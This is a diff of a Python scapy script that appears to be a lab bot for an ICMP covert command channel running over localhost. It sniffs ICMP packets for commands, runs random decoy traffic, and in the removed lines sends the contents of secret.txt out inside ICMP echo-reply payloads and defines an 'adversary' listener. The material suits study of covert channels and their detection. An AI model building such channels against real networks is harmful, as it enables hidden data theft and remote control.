@@ -8,28 +8,11 @@ import requests
 from scapy.all import *
 from scapy.layers.inet import ICMP, IP
 
-destIP = ''
-srcIP = ''
+destIP = 'localhost'
+srcIP = 'localhost'
 interface = '\\Device\\NPF_Loopback'
 
-def connectToAdversary():
-    host = 'localhost'
-    port = 65000
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((host, port))
-
-    server.listen(5)
-
-    conn, addr = server.accept()
-    with conn:
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            print(data.decode())
-            data = conn.recv(1024)
-
+receivedResponse = False
 
 def sendGetRequest():
     address = destIP
@@ -66,7 +49,7 @@ def processSecret(packet):
     with open('secret.txt') as f:
         string = "botreply" + f.readline()
     time.sleep(1)
-    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) / string.encode())
+    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) )
 
 def processCommand(packet):
     command = packet[Raw].load.decode()[7:]
@@ -82,14 +65,16 @@ def sniffForPacket():
     sniff(iface=interface, prn=processPacket, filter='icmp')
 
 
-# functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]
+# functionList = [sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]
 
-functionList = [sendICMPPing()]
+functionList = [sendICMPPing]
 
-while True:
-    sniffForPacket()
 
-    waitTime = random.randint(1, 10)
-    time.sleep(waitTime)
+if __name__ == '__main__':
+    p = Process(target=sniffForPacket)
+    p.start()
 
-    random.choice(functionList)
+    while True:
+        waitTime = random.randint(1, 10)
+        time.sleep(waitTime)
+        random.choice(functionList)()
